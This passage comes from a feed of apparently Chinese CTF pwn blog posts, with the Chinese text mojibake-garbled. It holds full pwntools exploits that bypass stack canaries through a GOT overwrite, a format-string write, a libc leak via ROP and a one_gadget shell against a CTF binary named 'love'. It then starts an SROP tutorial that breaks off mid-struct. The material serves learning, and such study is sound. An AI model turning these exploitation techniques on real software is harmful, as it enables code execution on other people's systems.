class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>stack_chk_fail_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'__stack_chk_fail'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>getshell <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'getshell'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>pl <span class=\"token operator\">=</span> fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">&#123;</span>stack_chk_fail_got<span class=\"token punctuation\">:</span> getshell<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>pl <span class=\"token operator\">=</span> pl<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>se<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ÊñπÊ≥ï‰∫î-tslÂÖ®Ë¶ÜÁõñ\"><a class=\"markdownIt-Anchor\" href=\"#ÊñπÊ≥ï‰∫î-tslÂÖ®Ë¶ÜÁõñ\">#</a> ÊñπÊ≥ï‰∫î TSL ÂÖ®Ë¶ÜÁõñ</h3>\n<h5 id=\"ÂéüÁêÜ-5\"><a class=\"markdownIt-Anchor\" href=\"#ÂéüÁêÜ-5\">#</a> ÂéüÁêÜ</h5>\n<p>Â∑≤Áü• Canary ÂÇ®Â≠òÂú® TLS ‰∏≠ÔºåÂú®ÂáΩÊï∞ËøîÂõûÂâç‰ºö‰ΩøÁî®Ëøô‰∏™ÂÄºËøõË°åÂØπÊØî„ÄÇÂΩìÊ∫¢Âá∫Â∞∫ÂØ∏ËæÉÂ§ßÊó∂ÔºåÂèØ‰ª•ÂêåÊó∂Ë¶ÜÁõñÊ†à‰∏äÂÇ®Â≠òÁöÑ Canary Âíå TLS ÂÇ®Â≠òÁöÑ Canary ÂÆûÁé∞ÁªïËøá„ÄÇ</p>\n<h5 id=\"love\"><a class=\"markdownIt-Anchor\" href=\"#love\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubnNzY3RmLmNuL3Byb2JsZW0vNDE4Mg==\">love</span></h5>\n<h6 id=\"Ê£ÄÊü•-3\"><a class=\"markdownIt-Anchor\" href=\"#Ê£ÄÊü•-3\">#</a> Ê£ÄÊü•</h6>\n<p><img data-src=\"/img/canary/image-20230804100611025.png\" alt=\"image-20230804100611025\"></p>\n<h6 id=\"ida-5\"><a class=\"markdownIt-Anchor\" href=\"#ida-5\">#</a> ida</h6>\n<p><img data-src=\"/img/canary/image-20230804100726428.png\" alt=\"image-20230804100726428\"></p>\n<p><img data-src=\"/img/canary/image-20230804100739512.png\" alt=\"image-20230804100739512\"></p>\n<p>ÂæàÊòéÊòæÔºåËÉΩÂ§üÁúãÂà∞ canary ‰øùÊä§ÔºåÂπ∂‰∏îËÉΩÊâæÂà∞Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤ÊºèÊ¥ûÔºåÂíå vuln ÁöÑÊ†àÊ∫¢Âá∫ÊºèÊ¥û„ÄÇÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÈÄöËøá read ÂáΩÊï∞ËØªÂÖ•Êï∞ÊçÆÔºåËÆ©Ê†ºÂºèÂåñÂ≠óÁ¨¶Ë¶ÜÁõñÂÜÖÂ≠òÂú∞ÂùÄÔºå‰ªéËÄåÁªïËøáÂà§Êñ≠ÔºåËøõÂÖ• vuln ‰∏≠„ÄÇÂÜçÈÄöËøáË¶ÜÁõñ TLS ‰∏≠ÂÇ®Â≠òÁöÑ Canary ÂÄºÂíåÊ†à‰∏ä‰∏¥Êó∂Â≠òÁöÑ canary ÁöÑÂÄº„ÄÇÁªïËøá canaryÔºåËææÊàêÊîªÂáªÊâãÊÆµ„ÄÇ</p>\n<p><img data-src=\"/img/canary/image-20230804101610167.png\" alt=\"image-20230804101610167\"></p>\n<p>‰ªé‰∏≠ÂèØ‰ª•ÊâæÂà∞ 0x22b„ÄÅ0x208 Êç¢ÁÆó‰∏Ä‰∏ãÂ∞±ÊòØ 555 Âíå 520ÔºåËÆ°ÁÆó‰∏Ä‰∏ãÂÅèÁßª‰∏∫ 9</p>\n<p>ÊâÄ‰ª• payload</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%520s%9$n'</span></pre></td></tr></table></figure><p>‰ΩÜÊòØÂú®ËøôÈáåÊàë‰ª¨‰πüËÉΩÂèëÁé∞ canary ÁöÑÂΩ±Â≠êÔºåÂú®ÂÅèÁßª 15 ÁöÑ‰ΩçÁΩÆ„ÄÇÁªèËøáÂ§öÊ¨°ËæìÂÖ•Ëøô‰∏™Â≠óÊÆµÔºåËØÅÂÆû‰∫ÜÊàë‰ª¨ÁåúÊµã„ÄÇÊâÄ‰ª•ËøôÈ¢ò‰πüÂèØ‰ª•ÈÄöËøáÊ≥ÑÈú≤ canary Êù•ÁªïËøá„ÄÇ</p>\n<p>ÁªïËøáÂà§Êñ≠‰πãÂêé„ÄÇ</p>\n<p>Ê≥ÑÈú≤ libc Âü∫ÂùÄ„ÄÇ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0xa00</span></pre></td></tr></table></figure><p>ÊúÄÂêéËé∑Âèñ shell Âç≥ÂèØ„ÄÇ</p>\n<h6 id=\"exp-5\"><a class=\"markdownIt-Anchor\" href=\"#exp-5\">#</a> exp</h6>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>gets_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'gets'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>rdi <span class=\"token operator\">=</span> <span class=\"token number\">0x00000000004013f3</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>ret <span class=\"token operator\">=</span> <span class=\"token number\">0x40101a</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'%520s%9$n'</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b\"I want to hear your praise of Toka\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'I know you like him, but you must pass my level\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>vuln <span class=\"token operator\">=</span> <span class=\"token number\">0x40125D</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>rdi<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>vuln<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0xa00</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>puts <span class=\"token operator\">=</span> lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>base <span class=\"token operator\">=</span> puts <span class=\"token operator\">-</span> <span class=\"token number\">0x84420</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>system <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> <span class=\"token number\">0x52294</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>bin_sh <span class=\"token operator\">=</span> base <span class=\"token operator\">+</span> <span class=\"token number\">0x1B45BD</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'----------------->'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'I know you like him, but you must pass my level\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>pl <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x30</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>base<span class=\"token operator\">+</span><span class=\"token number\">0xe3b01</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x1000</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\"># ong_gadget base+0xe3b01</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "canary"
            ]
        },
        {
            "id": "http://example.com/2023/08/03/srop/",
            "url": "http://example.com/2023/08/03/srop/",
            "title": "srop",
            "date_published": "2023-08-03T14:51:25.000Z",
            "content_html": "<h1 id=\"srop\"><a class=\"markdownIt-Anchor\" href=\"#srop\">#</a> srop</h1>\n<h2 id=\"sropÂéüÁêÜ\"><a class=\"markdownIt-Anchor\" href=\"#sropÂéüÁêÜ\">#</a> srop ÂéüÁêÜ</h2>\n<h3 id=\"signal-Êú∫Âà∂\"><a class=\"markdownIt-Anchor\" href=\"#signal-Êú∫Âà∂\">#</a> signal Êú∫Âà∂ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9zdGFja292ZXJmbG93L3g4Ni9hZHZhbmNlZC1yb3Avc3JvcC8jc2lnbmFs\">¬∂</span></h3>\n<p>signal Êú∫Âà∂ÊòØÁ±ª unix Á≥ªÁªü‰∏≠ËøõÁ®ã‰πãÈó¥Áõ∏‰∫í‰º†ÈÄí‰ø°ÊÅØÁöÑ‰∏ÄÁßçÊñπÊ≥ï„ÄÇ‰∏ÄËà¨ÔºåÊàë‰ª¨‰πüÁß∞ÂÖ∂‰∏∫ËΩØ‰∏≠Êñ≠‰ø°Âè∑ÔºåÊàñËÄÖËΩØ‰∏≠Êñ≠„ÄÇÊØîÂ¶ÇËØ¥ÔºåËøõÁ®ã‰πãÈó¥ÂèØ‰ª•ÈÄöËøáÁ≥ªÁªüË∞ÉÁî® kill Êù•ÂèëÈÄÅËΩØ‰∏≠Êñ≠‰ø°Âè∑„ÄÇ‰∏ÄËà¨Êù•ËØ¥Ôºå‰ø°Âè∑Êú∫Âà∂Â∏∏ËßÅÁöÑÊ≠•È™§Â¶Ç‰∏ãÂõæÊâÄÁ§∫Ôºö</p>\n<p><img data-src=\"/img/srop/ProcessOfSignalHandlering.png\" alt=\"Process of Signal Handlering\"></p>\n<ol>\n<li>ÂÜÖÊ†∏ÂêëÊüê‰∏™ËøõÁ®ãÂèëÈÄÅ signal Êú∫Âà∂ÔºåËØ•ËøõÁ®ã‰ºöË¢´ÊöÇÊó∂ÊåÇËµ∑ÔºåËøõÂÖ•ÂÜÖÊ†∏ÊÄÅ„ÄÇ</li>\n<li>ÂÜÖÊ†∏‰ºö‰∏∫ËØ•ËøõÁ®ã‰øùÂ≠òÁõ∏Â∫îÁöÑ‰∏ä‰∏ãÊñáÔºå<strong>‰∏ªË¶ÅÊòØÂ∞ÜÊâÄÊúâÂØÑÂ≠òÂô®ÂéãÂÖ•Ê†à‰∏≠Ôºå‰ª•ÂèäÂéãÂÖ• signal ‰ø°ÊÅØÔºå‰ª•ÂèäÊåáÂêë sigreturn ÁöÑÁ≥ªÁªüË∞ÉÁî®Âú∞ÂùÄ</strong>„ÄÇÊ≠§Êó∂Ê†àÁöÑÁªìÊûÑÂ¶Ç‰∏ãÂõæÊâÄÁ§∫ÔºåÊàë‰ª¨Áß∞ ucontext ‰ª•Âèä siginfo Ëøô‰∏ÄÊÆµ‰∏∫ Signal Frame„ÄÇ** ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåËøô‰∏ÄÈÉ®ÂàÜÊòØÂú®Áî®Êà∑ËøõÁ®ãÁöÑÂú∞ÂùÄÁ©∫Èó¥ÁöÑ„ÄÇ** ‰πãÂêé‰ºöË∑≥ËΩ¨Âà∞Ê≥®ÂÜåËøáÁöÑ signal handler ‰∏≠Â§ÑÁêÜÁõ∏Â∫îÁöÑ signal„ÄÇÂõ†Ê≠§ÔºåÂΩì signal handler ÊâßË°åÂÆå‰πãÂêéÔºåÂ∞±‰ºöÊâßË°å sigreturn ‰ª£Á†Å„ÄÇ</li>\n</ol>\n<p>ÂØπ‰∫é signal Frame Êù•ËØ¥Ôºå‰ºöÂõ†‰∏∫Êû∂ÊûÑÁöÑ‰∏çÂêåËÄåÊúâÊâÄÂå∫Âà´ÔºåËøôÈáåÁªôÂá∫ÂàÜÂà´ÁªôÂá∫ x86 ‰ª•Âèä x64 ÁöÑ sigcontext</p>\n<ul>\n<li>x86</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">,</span> __gsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">,</span> __fsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> es<span class=\"token punctuation\">,</span> __esh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ds<span class=\"token punctuation\">,</span> __dsh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esi<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ecx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eax<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> trapno<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> err<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">,</span> __csh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eflags<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp_at_signal<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ss<span class=\"token punctuation\">,</span> __ssh<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> oldmask<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> cr2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><ul>\n<li>x64</li>\n</ul>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token comment\">/* FPU environment matching the 64-bit FXSAVE layout.  */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  __uint16_t        cwd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  __uint16_t        swd<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  __uint16_t        ftw<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  __uint16_t        fop<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  __uint64_t        rip<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  __uint64_t        rdp<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  __uint32_t        mxcsr<span 